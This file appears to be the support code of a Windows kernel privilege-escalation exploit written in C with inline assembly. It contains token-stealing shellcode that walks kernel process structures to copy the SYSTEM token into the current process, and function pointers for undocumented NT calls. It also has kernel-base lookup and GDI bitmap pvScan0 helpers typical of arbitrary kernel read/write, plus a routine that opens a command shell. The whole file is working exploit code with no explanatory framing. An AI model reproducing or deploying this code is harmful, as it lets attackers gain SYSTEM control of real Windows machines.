#include<Windows.h>

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn)
	{
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}
}

__declspec(naked) VOID ShellCode()
{
	_asm
	{
		nop
		pushad
		mov eax, fs: [124h]
		mov eax, [eax + 0x50]
		mov ecx, eax
		mov edx, 4

		find_sys_pid :
		mov eax, [eax + 0xb8]
		sub eax, 0xb8
		cmp[eax + 0xb4], edx
		jnz find_sys_pid

		mov edx, [eax + 0xf8]
		mov[ecx + 0xf8], edx
		popad
		ret
	}
}

// NtAllocateReserveObject
typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef NTSTATUS(WINAPI* NtAllocateReserveObject_t)(OUT PHANDLE	hObject,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN DWORD              ObjectType);

NtAllocateReserveObject_t NtAllocateReserveObject;

// 0x60
#define IO_COMPLETION_OBJECT 1

// NtAllocateVirtualMemory
typedef NTSTATUS
(WINAPI* NtAllocateVirtualMemory_t)(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN ULONG ZeroBits,
	IN OUT PULONG RegionSize,
	IN ULONG AllocationType,
	IN ULONG Protect
	);

NtAllocateVirtualMemory_t NtAllocateVirtualMemory;

// NtQueryIntervalProfile_t
typedef NTSTATUS(WINAPI* NtQueryIntervalProfile_t)(
	IN ULONG ProfileSource,
	OUT PULONG Interval
	);

NtQueryIntervalProfile_t NtQueryIntervalProfile;

// GetKernelBase
LPVOID GetKernelBase(CHAR *name)
{
	LPVOID lpImageBase[1024];
	DWORD lpcbNeeded;
	CHAR lpfileName[1024];
	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);

	for (int i = 0; i < 1024; i++)
	{
		GetDeviceDriverBaseNameA(lpImageBase[i], lpfileName, 48);
		if (!strcmp(lpfileName, name))
		{
			printf("[+] success to get %s\n", lpfileName);
			return lpImageBase[i];
		}
	}
	return NULL;
}

// getpvscan0
DWORD getpeb()
{
	//in NT kennel£¬FS -> TEB£¬*[TEB+0x30] -> PEB
	DWORD p = (DWORD)__readfsdword(0x18);
	p = *(DWORD*)((char*)p + 0x30);
	return p;
}

DWORD gTableOffset = 0x094;
DWORD getgdi()
{
	return *(DWORD*)(getpeb() + gTableOffset);
}

DWORD gtable;
typedef struct
{
	LPVOID pKernelAddress;
	USHORT wProcessId;
	USHORT wCount;
	USHORT wUpper;
	USHORT wType;
	LPVOID pUserAddress;
} GDICELL;

PVOID getpvscan0(HANDLE h)
{
	if (!gtable)
		gtable = getgdi();
	DWORD p = (gtable + LOWORD(h) * sizeof(GDICELL)) & 0x00000000ffffffff;
	GDICELL* c = (GDICELL*)p;
	return (char*)c->pKernelAddress + 0x30;
}